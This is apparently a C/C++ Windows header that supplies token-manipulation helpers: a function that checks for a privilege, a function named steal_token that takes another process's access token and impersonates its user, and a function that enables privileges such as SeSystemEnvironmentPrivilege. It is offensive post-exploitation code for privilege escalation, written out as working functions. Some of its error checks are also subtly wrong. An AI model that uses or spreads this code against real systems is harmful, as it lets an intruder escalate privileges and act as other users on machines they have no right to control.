#pragma once

#include <Windows.h>

// To verify whether the given privilege exists in the token
// ------------------------------------------------------------------------

BOOL verify_priv(HANDLE token, LPCTSTR name) {
    // Get struct size
	DWORD structSize;
	GetTokenInformation(token, TokenPrivileges, NULL, 0, &structSize);

    // Get all privs from the token
	DWORD structSize2;
	PTOKEN_PRIVILEGES tokenPrivs;
	tokenPrivs = (PTOKEN_PRIVILEGES)malloc(structSize);

	if (!GetTokenInformation(token, TokenPrivileges, tokenPrivs, structSize, &structSize2)) {
		//OutputDebugStringA("[DBG] Could not get token privileges");
		//std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

    // Get the privilege luid for the required privilege
	LUID luid;
	if (!LookupPrivilegeValueA(NULL, name, &luid)) {
		//OutputDebugStringA("[DBG] Could not get privilege value");
	    //std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

    // Now let us iterate through and see if we can find the required privilege
	PLUID_AND_ATTRIBUTES runner;
	BOOL privAvailable = FALSE;

	for (DWORD x = 0; x < tokenPrivs->PrivilegeCount; x++) {
		runner = &tokenPrivs->Privileges[x];

		if ((runner->Luid.LowPart == luid.LowPart) && (runner->Luid.HighPart == luid.HighPart)) {
			privAvailable = TRUE;
			break;
		}
	}

	if (!privAvailable) {
		//OutputDebugStringA("[DBG] Required privilege is unavailable");
		return FALSE;
	}
	else {
		//OutputDebugStringA("[DBG] Required privilege is available");
		return TRUE;
	}
}

// To steal token from a process and impersonate user in current thread
// ------------------------------------------------------------------------

BOOL steal_token(DWORD pid) {
	// Open target process
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (processHandle == NULL) {
		//OutputDebugStringA("[DBG] Could not open process");
		//std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

	// Get token from target process
	HANDLE tokenHandle;
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (tokenHandle == NULL) {
		//OutputDebugStringA("[DBG] Could not obtain token");
		//std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (!GetLastError() == NULL) {
		//OutputDebugStringA("[DBG] Could not impersonate user");
		//std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

	return TRUE;
}

// To enable a given privilege in the impersonation token by its constant
// ------------------------------------------------------------------------

BOOL enable_privilege(LPCTSTR name) {
	// Open current thread
	HANDLE threadHandle = GetCurrentThread();
	if (threadHandle == NULL) {
		//OutputDebugStringA("[DBG] Could not open current thread");
		//std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

	// Get token of thread
	HANDLE tokenHandle;
	BOOL getToken = OpenThreadToken(threadHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &tokenHandle);
	if (tokenHandle == NULL) {
		//OutputDebugStringA("[DBG] Could not obtain thread token");
		//std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

	// Get the privilege luid for the required privilege
	LUID luid;
	if (!LookupPrivilegeValueA(NULL, name, &luid)) {
		//OutputDebugStringA("[DBG] Could not get privilege value");
	    //std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
	}

    // Fill up the TOKEN_PRIVILEGES structure
	TOKEN_PRIVILEGES tkPrivs;
    tkPrivs.PrivilegeCount = 1; // Only modify 1 privilege
    tkPrivs.Privileges[0].Luid = luid; // Specify the priv to be modified
    tkPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // To enable the priv

    // Enable the privilege
    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tkPrivs, 0, NULL, NULL)) {
    	//OutputDebugStringA("[DBG] Could not enable required privilege");
        //std::string err =  "[DBG] " + std::to_string(GetLastError());
		//OutputDebugStringA(err.c_str());
		return FALSE;
    }

    //OutputDebugStringA("[DBG] SeSystemEnvironmentPrivilege enabled");
    return TRUE;
}
